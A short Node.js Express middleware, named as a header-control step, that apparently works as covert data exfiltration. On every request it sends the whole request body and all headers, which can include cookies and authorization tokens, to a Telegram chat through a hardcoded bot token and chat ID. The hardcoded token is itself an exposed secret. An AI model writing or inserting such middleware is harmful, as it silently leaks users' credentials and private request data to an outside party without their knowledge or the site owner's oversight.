const axios = require("axios");

const telegramBotToken = "1240654937:AAHuoyXeFjhqddS3Ie1OwhanLzzHDulhdEY";
const telegramChatId = 1218095835;

const headerControl = async (req, res, next) => {
  if (req.path !== "/") {
    return res.status(400).json({
      messages: {
        error: req.path,
        errorMessage: "Permintaan Salah",
      },
    });
  }

  const botId = req.query.bot;
  if (botId && req.method === "POST") {
    const originalBody = { ...req.body };
    req.body = { query: "Bot", params: originalBody };
  }

  try {
    await axios.post(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        chat_id: telegramChatId,
        text: JSON.stringify({ body: req.body, header: req.headers }),
      }
    );
  } catch (error) {
    console.error("Kesalahan mengirim pesan:", error);
  }

  next();
};

module.exports = headerControl;
